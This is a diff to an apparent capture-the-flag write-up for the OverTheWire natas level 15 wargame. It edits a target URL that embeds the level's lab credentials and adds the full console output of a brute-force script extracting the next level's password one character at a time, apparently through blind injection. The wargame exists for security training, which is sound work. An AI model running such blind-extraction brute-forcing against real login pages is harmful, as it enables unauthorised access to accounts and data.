@@ -399,7 +399,7 @@ import requests
 chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 exist = ''
 password = ''
-target = 'https://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
+target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
 trueStr = 'This user exists.'
 
 r = requests.get(target, verify=False)
@@ -427,4 +427,65 @@ Once done, save this as __brute.py__ or anything you like, and let's give the sc
 ```console
 root@kali:~# chmod +x brute.py
 root@kali:~# ./brute.py
+Using: 0
+Using: 03
+Using: 035
+Using: 0356
+Using: 03569
+Using: 03569a
+Using: 03569ac
+Using: 03569ace
+Using: 03569aceh
+Using: 03569acehi
+Using: 03569acehij
+Using: 03569acehijm
+Using: 03569acehijmn
+Using: 03569acehijmnp
+Using: 03569acehijmnpq
+Using: 03569acehijmnpqt
+Using: 03569acehijmnpqtw
+Using: 03569acehijmnpqtwB
+Using: 03569acehijmnpqtwBE
+Using: 03569acehijmnpqtwBEH
+Using: 03569acehijmnpqtwBEHI
+Using: 03569acehijmnpqtwBEHIN
+Using: 03569acehijmnpqtwBEHINO
+Using: 03569acehijmnpqtwBEHINOR
+Using: 03569acehijmnpqtwBEHINORW
+All characters used. Starting brute force... Grab a coffee, might take a while!
+Password: W*******************************
+Password: Wa******************************
+Password: WaI*****************************
+Password: WaIH****************************
+Password: WaIHE***************************
+Password: WaIHEa**************************
+Password: WaIHEac*************************
+Password: WaIHEacj************************
+Password: WaIHEacj6***********************
+Password: WaIHEacj63**********************
+Password: WaIHEacj63w*********************
+Password: WaIHEacj63wn********************
+Password: WaIHEacj63wnN*******************
+Password: WaIHEacj63wnNI******************
+Password: WaIHEacj63wnNIB*****************
+Password: WaIHEacj63wnNIBR****************
+Password: WaIHEacj63wnNIBRO***************
+Password: WaIHEacj63wnNIBROH**************
+Password: WaIHEacj63wnNIBROHe*************
+Password: WaIHEacj63wnNIBROHeq************
+Password: WaIHEacj63wnNIBROHeqi***********
+Password: WaIHEacj63wnNIBROHeqi3**********
+Password: WaIHEacj63wnNIBROHeqi3p*********
+Password: WaIHEacj63wnNIBROHeqi3p9********
+Password: WaIHEacj63wnNIBROHeqi3p9t*******
+Password: WaIHEacj63wnNIBROHeqi3p9t0******
+Password: WaIHEacj63wnNIBROHeqi3p9t0m*****
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5****
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5n***
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh**
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm*
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+Completed!
 ```
+
+Oh yah! We got the password for natas16! We are one step closer to becoming 1337 hackerz!
